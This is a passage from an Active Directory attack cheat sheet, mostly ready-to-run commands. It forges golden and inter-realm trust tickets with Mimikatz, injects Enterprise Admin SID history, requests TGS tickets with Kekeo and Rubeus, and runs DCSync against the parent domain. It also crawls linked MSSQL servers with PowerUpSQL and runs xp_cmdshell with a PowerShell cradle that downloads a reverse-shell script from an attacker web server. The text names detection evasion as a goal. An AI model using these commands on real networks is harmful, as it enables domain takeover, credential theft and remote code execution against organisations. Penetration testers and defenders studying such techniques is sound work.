 - `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`

Create the Inter-Realm TGT and inject Administrator account into the SID History
 - `Invoke-Mimikatz -Command '"kerberos::golden /user:<usertoimpersonate> /domain:<currentdomain> /sid:<currentdomainSID> /sids:<SIDofenterpriseadmingroupontarget> /rc4:<trustkeyhash> /service:krbtgt /target:<targetdomainFQDN> /ticket:<path/to/tickettosave.kirbi>"'`
Use the ticket to create a TGS for CIFS on the parent domain
 - Using Kekeo
	 - Request the TGS
	 - `.\asktgs.exe C:\AD\trust_tkt.kirbi CIFS/<parentdomaindc>`
	 - Present the TGS to the target service
	 - `.\kirbikator.exe lsa .\<savedticket.kirbi>`
	 - `ls \\<parentdomain-dc>\c$`
 - Using Rubeus
	 - Request and use the TGS using the trust key ticket created earlier
	 - `.\Rubeus.exe asktgs /ticket:C:\AD\trust_tkt.kirbi /service:CIFS/<parentdomaindc> /dc:<parentdomain-dc> /ptt`
##### krbtgt
You can also inject the SIDHistory of Enterprise Admins group as part of a golden ticket attack
`Invoke-Mimikatz -Command '"kerberos::golden /user:<usertoimpersonate> /domain:<currentdomain> /sid:<currentdomainSID> /sids:<SIDofenterpriseadmingroupontarget> /krbtgt:<currentdomainkrbtgthash> /ptt"'`
Now run commands as enterprise admin on the parent domain:
`gwmi -class win32_operatingsystem -computername <parentdc>`

You can also avoid detection by impersonating the Domain Controller and the Domain Controllers group
(SID 516 is domain controllers group, S-1-5-9 is Enterprise Domain Controllers SID)
`Invoke-Mimikatz -Command '"kerberos:golden /user:<currentdomaindc$> /domain:<currentdomain> /sid:<currentdomainsid> /groups:516 /sids:<currentdomaindomaincontrollersgroupSID>,S-1-5-9 /krbtgt:<currentdomainkrbtgthash> /ptt"'`
Profit:
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parentdomain>/Administrator /domain:<parentdomain>"'`

#### Forest Trusts
SID History won't work over a forest trust due to SID filtering.
Use Rubeus to inject a Trust ticket with Mimikatz as above, into a TGS request across a Forest trust and access a CIFS shared service
`.\Rubeus.exe asktgs /ticket:<path\to\trust_ticket.kirbi> /service:cifs/<otherdomaindc.domain.com> /dc:<otherdomaindc> /ptt`
`ls \\otherdomaindc.domain.com\share`

### Trust Abuse with MSSQL
#### Using PowerUpSQL
github.com/NetSPI/PowerUpSQL
 - Enumerate SQL Servers by SPN Scanning
`Get-SQLInstanceDomain`
 - Check Accessibility
`Get-SQLConnectionTestThreaded`
 - Combine the two
`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded`
 - Get Server Information to see if we have access (look for "IsSysAdmin" or other interesting privileges)
`Get-SQLInstanceDomain | Get-SQLServerInfo`
 - Using something like HeidiSQL (portable), login and look for database links to other servers
`select * from master..sysservers`
 - Enumerate further links from there
`select * from openquery("<nextSQLserver>",'select * from master..sysservers')`
 - and continue along the links
`select * from openquery("<nextSQLserver>",'select * from openquery("<nextSQLserver2>",''select * from master..sysservers'')')`
 - PowerUpSQL can enumerate the links also
`Get-SQLServerLink -Instance <target-SQL>`
 - Automatically crawl SQL Server Links
`Get-SQLServerLinkCrawl -Instance <target-sql>`
 - Where xp_cmdshell or RPC is enabled, execute commands within the CustomQuery field
`Get-SQLServerLinkCrawl -Instance <target-sql>  -Query "exec master..xp_cmdshell 'whoami'`
`Get-SQLServerLinkCrawl -Instance <target-sql> -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://<webserver>/Invoke-PowerShellTcp.ps1'')"'`
 - Or manually
`select * from openquery("<target-sql1>",'select * from openquery("<target-sql2>",''select * from openquery("<target-sql3>",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')`
 - If xp_cmdshell is disabled, but rpcout is enabled you can then enable xp_cmdshell
`EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "<target-sql>"`